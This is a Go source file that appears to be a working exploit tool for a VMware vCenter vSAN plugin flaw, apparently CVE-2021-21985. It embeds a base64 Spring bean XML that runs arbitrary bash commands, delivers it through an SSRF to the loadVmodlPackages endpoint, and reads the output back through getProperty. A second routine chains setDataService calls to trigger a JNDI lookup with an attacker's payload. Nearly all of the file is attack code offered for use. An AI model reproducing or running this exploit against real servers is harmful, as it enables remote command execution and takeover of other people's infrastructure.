package c_21985

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"time"

	"github.com/imroc/req/v3"
)

var user_agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36 Edg/80.0.361.54"

func To_b64(file_byte []byte) string {
	// fmt.Println(base64.StdEncoding.EncodeToString(file_byte))
	return base64.StdEncoding.EncodeToString(file_byte)

}

func Upload(url, b64_str string) {

	ssrf_url := strings.Replace("https://localhost:443/vsanHealth/vum/driverOfflineBundle/data:text/html%3Bbase64,qq%23", "qq", b64_str, -1)
	tarGet := url + "/ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages"
	// fmt.Println(ssrf_url)
	// jsonText := "{\"methodInput\":" + "[[\"" + ssrf_url + "\"]]}"
	jsonText := fmt.Sprintf("{\"methodInput\":[[\"%s\"]]}", ssrf_url)

	client := req.C().DisableDumpAll().DisableDebugLog()
	client.EnableInsecureSkipVerify()
	client.EnableForceHTTP1()
	client.SetTimeout(3 * time.Second)
	client.DisableKeepAlives()
	client.SetUserAgent(user_agent)
	resp, err := client.R().SetContentType("application/json").SetBodyString(jsonText).Post(tarGet)
	if err != nil {
		_ = err
		fmt.Println("[-] 上传失败，请检查网络.")
		os.Exit(0)
	}
	if resp.StatusCode == 200 {
		fmt.Println("[+] 上传成功，开始命令执行.")
	} else {
		fmt.Println("[-] 上传失败，目标不存在漏洞.")
		os.Exit(0)
	}

	// fmt.Println(client)

}

func Execute(url string) {

	tarGet := url + "/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty"

	jsonText := "{\"methodInput\":" + " [" + "\"output\", null" + "]}"

	client := req.C().DisableDumpAll().DisableDebugLog()
	client.EnableInsecureSkipVerify()
	client.EnableForceHTTP1()
	client.SetTimeout(3 * time.Second)
	client.SetUserAgent(user_agent)
	client.DisableKeepAlives()
	resp, err := client.R().SetContentType("application/json").SetBody(jsonText).Post(tarGet)
	if err != nil {
		fmt.Println("[-] 命令执行失败，请检查网络.")
		os.Exit(0)
	}
	_ = err

	// fmt.Println(string(data))
	// fmt.Println(jsonparser.GetString([]byte(data), "result"))

	fmt.Println(strings.Replace(resp.String(), "\\n", "\n", -1))

}

func Generate_xml(command string) []byte {
	b64_str := "PGJlYW5zIHhtbG5zPSJodHRwOi8vd3d3LnNwcmluZ2ZyYW1ld29yay5vcmcvc2NoZW1hL2JlYW5zIgogICAgICAgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSIKICAgICAgIHhzaTpzY2hlbWFMb2NhdGlvbj0iCiAgICAgaHR0cDovL3d3dy5zcHJpbmdmcmFtZXdvcmsub3JnL3NjaGVtYS9iZWFucyBodHRwOi8vd3d3LnNwcmluZ2ZyYW1ld29yay5vcmcvc2NoZW1hL2JlYW5zL3NwcmluZy1iZWFucy54c2QiPgogICAgPGJlYW4gaWQ9InBiIiBjbGFzcz0iamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyIj4KICAgICAgICA8Y29uc3RydWN0b3ItYXJnPgogICAgICAgICAgPGxpc3Q+CiAgICAgICAgICAgIDx2YWx1ZT4vYmluL2Jhc2g8L3ZhbHVlPgogICAgICAgICAgICA8dmFsdWU+LWM8L3ZhbHVlPgogICAgICAgICAgICA8dmFsdWU+PCFbQ0RBVEFbIHtjbWR9IDI+JjEgXV0+PC92YWx1ZT4KICAgICAgICAgIDwvbGlzdD4KICAgICAgICA8L2NvbnN0cnVjdG9yLWFyZz4KICAgIDwvYmVhbj4KICAgIDxiZWFuIGlkPSJpcyIgY2xhc3M9ImphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXIiPgogICAgICAgIDxjb25zdHJ1Y3Rvci1hcmc+CiAgICAgICAgICAgIDx2YWx1ZT4je3BiLnN0YXJ0KCkuZ2V0SW5wdXRTdHJlYW0oKX08L3ZhbHVlPgogICAgICAgIDwvY29uc3RydWN0b3ItYXJnPgogICAgPC9iZWFuPgogICAgPGJlYW4gaWQ9ImJyIiBjbGFzcz0iamF2YS5pby5CdWZmZXJlZFJlYWRlciI+CiAgICAgICAgPGNvbnN0cnVjdG9yLWFyZz4KICAgICAgICAgICAgPHZhbHVlPiN7aXN9PC92YWx1ZT4KICAgICAgICA8L2NvbnN0cnVjdG9yLWFyZz4KICAgIDwvYmVhbj4KICAgIDxiZWFuIGlkPSJjb2xsZWN0b3JzIiBjbGFzcz0iamF2YS51dGlsLnN0cmVhbS5Db2xsZWN0b3JzIj48L2JlYW4+CiAgICA8YmVhbiBpZD0ic3lzdGVtIiBjbGFzcz0iamF2YS5sYW5nLlN5c3RlbSI+CiAgICAgICAgPHByb3BlcnR5IG5hbWU9IndoYXRldmVyIiB2YWx1ZT0iI3sgc3lzdGVtLnNldFByb3BlcnR5KCZxdW90O291dHB1dCZxdW90OywgYnIubGluZXMoKS5jb2xsZWN0KGNvbGxlY3RvcnMuam9pbmluZygmcXVvdDsKJnF1b3Q7KSkpIH0iLz4KICAgIDwvYmVhbj4KPC9iZWFucz4K"
	content, err := base64.StdEncoding.DecodeString(b64_str)
	_ = err
	con := string(content)
	xml_str := strings.Replace(con, "{cmd}", command, -1)

	// fmt.Println(xml_str)
	ioutil.WriteFile("offline_bundle.xml", []byte(xml_str), 0666)

	return []byte(xml_str)
}

func Zip_file(src string, xml_buf []byte) []byte {
	var buf bytes.Buffer
	// archive, err := os.Create(dst) //创建文件对象
	// if err != nil {
	// 	panic(err)
	// }
	zipWriter := zip.NewWriter(&buf) //初始化一个zip.Writer，用来将数据写入zip文件中
	// a, err := ioutil.ReadFile(src)
	// if err != nil {
	// 	panic(err)
	// }

	// f2, err := os.Open(src) //打开源文件
	// if err != nil {
	// 	panic(err)
	// }
	// defer f2.Close()

	w2, err := zipWriter.Create(src) //创建一个io.Writer
	if err != nil {
		panic(err)
	}
	//直接把源文件的内容copy到io.Writer中，即是写入到zip文件中
	// if _, err := io.Copy(w2, f2); err != nil {
	// 	panic(err)
	// }
	// w2.Write(a)

	w2.Write(xml_buf)
	zipWriter.Close()
	// _ = archive
	// fmt.Println(buf.Bytes())

	return buf.Bytes()

}

func Attack(url, command string) {
	t1 := Generate_xml(command)
	t2 := Zip_file("offline_bundle.xml", t1)
	t3 := To_b64(t2)
	Upload(url, t3)
	time.Sleep(1)
	Execute(url)
	// fmt.Println(To_b64(t1))
}

func send(url, uri, json_body string) {
	client := req.C()
	client.EnableInsecureSkipVerify()
	client.EnableForceHTTP1()
	base := "/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService"
	resp, err := client.R().SetBodyJsonString(json_body).Post(url + base + uri)
	if err != nil {
		log.Fatal(err)
		fmt.Println("[-] 连接失败，请检查网络.")
		os.Exit(0)

	}
	if uri == "/invoke" {
		if resp.StatusCode == 200 {
			return
		} else {
			fmt.Println("[-] 利用失败.")
			os.Exit(0)
		}
	}
	if !strings.Contains(resp.String(), "result") {
		fmt.Println("[-] 利用失败.")
		os.Exit(0)
	}
}

func Exploit(url, payload string) {

	fmt.Println("[*] 正在发送payload...")
	uris := []string{"/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"}
	send(url, uris[0], "{\"methodInput\": [null]}")
	send(url, uris[1], "{\"methodInput\": [\"javax.naming.InitialContext.doLookup\"]}")
	send(url, uris[2], "{\"methodInput\": [\"doLookup\"]}")
	send(url, uris[3], fmt.Sprintf("{\"methodInput\": [[\"%s\"]]}", payload))
	send(url, uris[4], "{\"methodInput\": [null]}")
	send(url, uris[5], "{\"methodInput\": []}")
	fmt.Println("[+] 发送成功.")

}
